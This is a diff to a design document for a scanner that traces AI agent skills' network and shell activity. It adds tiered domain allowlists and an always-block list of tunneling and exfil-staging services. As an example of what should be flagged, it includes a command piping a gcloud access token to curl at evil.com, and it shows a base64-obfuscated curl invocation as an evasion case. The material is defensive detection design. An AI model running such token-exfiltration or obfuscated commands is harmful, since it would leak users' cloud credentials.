@@ -170,21 +170,34 @@ The network layer needs two modes:
 
 **Blocklist mode (default):** All outbound calls are blocked and logged. Any destination not on the allowlist is a finding. IOC DB is checked against known C2 domains and exfil endpoints.
 
-**Allowlist mode (for legitimate tools):** Some skills legitimately call into Google APIs, GitHub, npm registries, or other known-good services via CLI tools (`gcloud`, `gh`, `npm`). These should be configurable per-scan via a `--allow-domains` flag or a YAML config file:
+**Allowlist mode (for legitimate tools):** Some skills legitimately call into Google APIs, GitHub, npm registries, or other known-good services via CLI tools (`gcloud`, `gh`, `npm`). The domain config system uses three tiers with clear precedence:
+
+```
+CLI flags  >  trace-config.yml  >  trace/domains/verified.yml (shipped defaults)
+```
+
+**Tier 1 — Shipped defaults** (`trace/domains/verified.yml`): Always-on for every scan. Covers package registries (npm, PyPI, crates.io, RubyGems, Maven, NuGet), source control (GitHub, GitLab, Bitbucket), CDNs, and DNS/NTP infrastructure. No configuration required.
+
+**Tier 2 — Named profiles**: Activated by `--profile <name>` or `profiles: [name]` in `trace-config.yml`. Covers major cloud providers and developer platforms: `google_cloud`, `aws`, `azure`, `openai`, `anthropic`, `huggingface`, `docker`, `kubernetes`, `vercel`, `netlify`, `stripe`, `slack`, `linear`, `notion`, `jira_confluence`, `datadog`, `sentry`, `cloudflare`, `supabase`, `neon`, `upstash`, `twilio`, `sendgrid`, `resend`, `posthog`. Not enabled by default — a skill with no legitimate reason to call AWS should not have AWS silently allowlisted.
+
+**Tier 3 — Per-scan overrides** (`trace-config.yml` or CLI):
 
 ```yaml
 # trace-config.yml
+profiles:
+  - google_cloud
+  - slack
 allow_domains:
-  - "*.googleapis.com"
-  - "*.github.com"
-  - "api.github.com"
-  - "registry.npmjs.org"
-  - "*.amazonaws.com"   # only if skill is an AWS tool
+  - "custom-internal-api.example.com"
+block_domains:
+  - "*.s3.amazonaws.com"  # override: flag even within the aws profile
 ```
 
-Calls to allowlisted domains are still **logged** (so the trace is complete) but do not generate findings. Calls to non-allowlisted domains generate an IOC/EXF finding with the destination URL.
+**Always-block list**: Certain domains are never allowlisted regardless of user config — tunneling services (`ngrok.io`, `serveo.net`, `localhost.run`), exfil staging services (`webhook.site`, `requestbin.com`), and known security research infrastructure (`burpcollaborator.net`, `oastify.com`, `interactsh.com`). These generate findings even if a user explicitly adds them to `allow_domains`.
 
-This is important: a skill that calls `gcloud auth print-access-token` and pipes it to `curl https://evil.com` should generate a finding on `evil.com` even if `googleapis.com` is allowlisted. The allowlist applies to the *destination*, not to the presence of credential-fetching commands.
+All network calls are **logged** regardless of allowlist status. Allowlisted domains suppress findings; they do not suppress logging.
+
+This is important: a skill that calls `gcloud auth print-access-token` and pipes it to `curl https://evil.com` still generates a finding on `evil.com` even if the `google_cloud` profile is active. The allowlist applies to the *destination*, not to the presence of credential-fetching commands.
 
 ### Generic Filesystem Interception
 
@@ -221,7 +234,7 @@ For v0.1, the bash interceptor should use a layered approach: first check the fu
 
 5. **Command parsing depth.** The `bash` tool interceptor needs to handle common obfuscation: variable expansion (`CMD=$(echo 'Y3VybA==' | base64 -d); $CMD ...`), subshell execution, and heredoc payloads. For v0.1, a pattern-based approach catches the obvious cases. A proper shell AST parser (e.g., using `bashlex` in Python) would catch more but adds complexity.
 
-6. **Allowlist config format.** The `--allow-domains` / `trace-config.yml` approach needs to be defined before SB3 (CLI harness). The config should also support `allow_paths` for skills that legitimately read files outside the default safe set (e.g., a git tool that reads `.git/config`).
+6. **Allowlist maintenance cadence.** The `trace/domains/verified.yml` file is bundled at Docker build time and versioned in the repo. The CLI should warn when the bundled file is >30 days old and offer `skillscan-trace update-domains` to pull the latest from the repo without rebuilding the image. Updates to `verified.yml` follow the same PR process as rule updates — frequent commits to the repo, less frequent Docker image rebuilds. The config should also support `allow_paths` for skills that legitimately read files outside the default safe set (e.g., a git tool that reads `.git/config`).
 
 ---
 
